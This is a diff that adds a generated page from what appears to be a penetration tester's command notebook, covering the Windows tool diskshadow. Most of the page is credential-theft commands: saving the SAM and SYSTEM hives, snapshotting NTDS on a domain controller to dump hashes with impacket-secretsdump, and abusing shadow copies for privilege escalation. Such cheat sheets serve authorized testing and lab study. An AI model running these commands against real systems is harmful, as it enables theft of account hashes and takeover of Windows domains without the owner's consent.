@@ -1,0 +1,55 @@
+---
+title: "diskshadow"
+sidebarTitle: "diskshadow"
+description: "Commands and examples collected from your diskshadow notes."
+keywords: ["diskshadow"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/diskshadow.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=diskshadow) · [All tools](/index)
+
+## C. SeBackup / SeRestore → read any file
+
+**Notebook example**
+
+```cmd
+:: grab SAM + SYSTEM (local account hashes)
+reg save HKLM\SAM  C:\Temp\SAM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+:: on a DC, snapshot NTDS via diskshadow + robocopy /b (backup mode), then:
+:: on Kali:  impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+1 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="EoP - Abusing Shadow Copies">
+
+### EoP - Abusing Shadow Copies
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+# List shadow copies using vssadmin (Needs Admnistrator Access)
+vssadmin list shadows
+  
+# List shadow copies using diskshadow
+diskshadow list shadows all
+  
+# Make a symlink to the shadow copy and access it
+mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+```
+
+</Accordion>
+
+</AccordionGroup>
